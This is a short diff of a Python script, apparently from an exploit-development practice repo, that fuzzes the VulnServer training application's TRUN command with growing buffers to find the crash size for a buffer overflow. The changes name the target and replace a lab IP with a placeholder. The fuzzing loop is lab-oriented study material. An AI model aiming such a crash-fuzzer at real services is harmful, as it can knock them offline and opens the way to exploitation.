@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # Carlos Enamorado 
 # 10/17/2023
-# Fuzzing for Buffer Overflow PoC
+# Fuzzing for Buffer Overflow PoC on VulnServer
 # Script will report the size of the buffer at which the service crashed
 
 import sys, socket
@@ -12,7 +12,7 @@ buffer = "A" * 100
 while True:
     try:
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('172.16.187.159',9999))
+        s.connect(('<VITCIM IP>',9999))
 
         s.send(('TRUN /.:/' + buffer))
         s.close()
